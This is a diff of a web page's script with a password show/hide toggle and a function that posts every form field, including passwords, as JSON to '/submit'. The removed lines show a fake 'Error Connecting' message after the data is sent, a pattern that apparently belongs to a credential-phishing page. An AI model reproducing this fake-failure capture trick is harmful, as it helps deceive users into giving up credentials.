@@ -131,41 +131,25 @@
             const toggleButton = document.getElementById('togglePassword');
             
             toggleButton.addEventListener('click', function() {
-                // Toggle the password input type
                 const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                 passwordInput.setAttribute('type', type);
                 
-                // Toggle the button text
                 this.textContent = type === 'password' ? 'Show' : 'Hide';
             });
         });
     
-
-        function sendMessage() {
+function sendMessage() {
   const form = document.getElementById('conforpky');
   const formData = new FormData(form);
-  formData.append("send", "true"); 
-
-  const sendButton = form.querySelector(".proceed-button");
-  sendButton.textContent = "Error Connecting";
-  sendButton.classList.add("error-button");
-  sendButton.disabled = true;
-
+  
   fetch("/submit", {
     method: "POST",
     headers: {
-      'Content-Type': 'application/json' 
+      'Content-Type': 'application/json'
     },
-    body: JSON.stringify(Object.fromEntries(formData)) 
+    body: JSON.stringify(Object.fromEntries(formData))
   });
 }
-
-
-const form = document.getElementById('conforpky');
-const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], textarea');
-inputs.forEach(input => {
-  input.value = '';
-});
 
 function clearSignInForm() {
   const form = document.getElementById('conforpky');
